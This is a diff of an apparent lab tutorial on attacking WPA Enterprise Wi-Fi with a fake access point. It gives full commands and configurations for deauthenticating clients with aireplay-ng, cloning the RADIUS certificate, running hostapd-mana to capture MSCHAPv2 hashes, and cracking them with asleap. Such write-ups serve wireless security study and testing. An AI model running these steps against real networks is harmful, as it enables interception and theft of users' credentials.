@@ -69,7 +69,7 @@ PEAP hashes are of the type netNTLMv1, that can be cracked with  -m 5500 in hash
 The attack against WPA Enterprise consists in setting up a fake Access Point that imitates the target Access Point, so that clients connect to ours and in the process we capture hashes of their passwords, that can be cracked.
 
 #### Identifying the objective
-1) Airodump-ng to get the BSSID and the MAC from one of the connected users:
+Airodump-ng to get the BSSID and the MAC from one of the connected users:
 ```bash
 sudo airodump-ng wlan0mon
  BSSID              PWR Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
@@ -82,13 +82,13 @@ sudo airodump-ng wlan0mon
 > The AUTH column shows the AP has an authentication type of MGT, meaning WPA Enterprise.
 {: .prompt-tip }
 
-2) Capture traffic
+#### Capture traffic
 Then we proceed to capture the packet as follows:
 ```bash
 sudo airodump-ng -c 2 -w wpa --essid 'Playtronics' --bssid FC:EC:DA:8F:2E:90 wlan0
 ```
 
-3) Deauthenticate the user
+#### Deauthenticate the user
 ```bash
 sudo aireplay-ng -0 1 -a FC:EC:DA:8F:2E:90 -c 00:DC:FE:82:EF:06 wlan0
 13:30:30  Waiting for beacon frame (BSSID: FC:EC:DA:8F:2E:90) on channel 1
@@ -98,7 +98,7 @@ sudo aireplay-ng -0 1 -a FC:EC:DA:8F:2E:90 -c 00:DC:FE:82:EF:06 wlan0
 > If no certificates are captured when the client reauthenticates, deauthenticate him again
 {: .prompt-warning }
 
-4) Analyze pcap with wireshark and extract certificate
+#### Analyze pcap with wireshark and extract certificate
 
 Wireshark filter for packets with certificate: ``tls.handshake.certificate`` also works for [Tshark](https://shuciran.github.io/posts/Remote-Capture/#fnref:tshark-eap)
 
@@ -106,11 +106,13 @@ If from wireshark we now open Extensible Authentication Protocol > Transport Lay
 
 ![Wireshark-Certificate-Download](/assets/img/Pasted image 20230928231211.png)
 
-Finally, we can get information about the certificate with `openssl x509 -inform der -in CERTIFICATE_FILENAME -text`
+Finally, we can get information about the certificate with `openssl x509 -inform der -in CERT_FILENAME -text` or we can check the validity by using ``openssl x509 -in CERT_FILENAME -noout -enddate`` where **CERT_FILENAME** is the .pem or .crt file.
 
-5) Install freeradius `sudo apt install freeradius` and modify its configuration files
+#### Modify Freeradius Configuration Files
 
-5.a) Certificate Authority
+Install freeradius `sudo apt install freeradius`
+
+##### Certificate Authority
 This should be similar to the certificate that we captured on step 4)
 ```bash
 # The folder is unreachable even with sudo, so you need to become root first
@@ -128,7 +130,7 @@ emailAddress            = ca@playtronics.com
 commonName              = "Playtronics Certificate Authority"
 ...
 ```
-5.b) Server Configuration
+##### Server Configuration
 We will edit the [server] fields to match our target server certificate
 ```bash
 nano server.cnf
@@ -143,7 +145,7 @@ commonName              = "Playtronics"
 ...
 ```
 
-6) Building Certificates
+#### Building Certificates
 Run the following to regenerate diffie hellman with a 2048 bit key and create the certificates
 
 ```bash
@@ -155,7 +157,7 @@ make
 > If we run make but the certificates already exist, we will not be able to overwrite them. We have to run `make destroycerts` to clean up first.
 {: .prompt-warning }
 
-7) Configuring hostapd
+#### Configuring hostapd
 Afterward, we have to create the hostapd-mana configuration file, /etc/hostapd-mana/mana.conf
 ```bash
 # SSID of the AP
@@ -212,7 +214,7 @@ mana_eapsuccess=1
 # EAP TLS MitM
 mana_eaptls=1
 ```
-8) Create the eap_user file
+#### Create the eap_user file
 
 We'll now need to create the EAP user file referenced in the configuration file, /etc/hostapd-mana/mana.eap_user. The file should contain the following.
 
@@ -221,7 +223,7 @@ We'll now need to create the EAP user file referenced in the configuration file,
 "t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
 ```
 
-9) Start hostapd-mana
+#### Start hostapd-mana
 Next, we'll start hostapd-mana with the configuration file we created earlier, /etc/hostapd-mana/mana.conf.
 ```bash
 sudo hostapd-mana /etc/hostapd-mana/mana.conf
@@ -249,7 +251,7 @@ MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377
 ...
 ```
 
-10) Cracking the password
+#### Cracking the password
 We will be using asleap to crack the password hash
 ```bash
 asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
@@ -260,18 +262,7 @@ Using wordlist mode with "/usr/share/john/password.lst".
         password:          password
 ```
 
-#### Optional: imitating the server certificates
-While it usually is not necessary, we will create a certificate similar to the one from the RADIUS server that the AP serves to its clients.
-
-
-
-We can check the validity by using ``openssl x509 -in CERT_FILENAME -noout -enddate`` where **CERT_FILENAME** is the .pem or .crt file. 
-
-We can now disable monitor mode 
-
-
-
-### hostapd-mana for wpa-enterprise
+### TIPS for hostapd-mana
 TIPS:
 - For testing you may need to change your client settings and turn off and on the wifi, while hostapd-mana remains running all the time, capturing creentials when connection attempts happen, and only if the configuration of the client is the right one for hostapd-mana to get hashes or credentials (EAP connections). at times hostapd-mana may behave strangely after many failed connections, just rerun it, but remember that most of the tweaking happens on the client when messing with the configuration, or if we want to generate traffic, just keep hostapd-mana running and turn off and on wifi on the client after changing the config.
 - The channel doesn't matter, but if we use the same as the original it's easier to monitor both networks at once with airodump
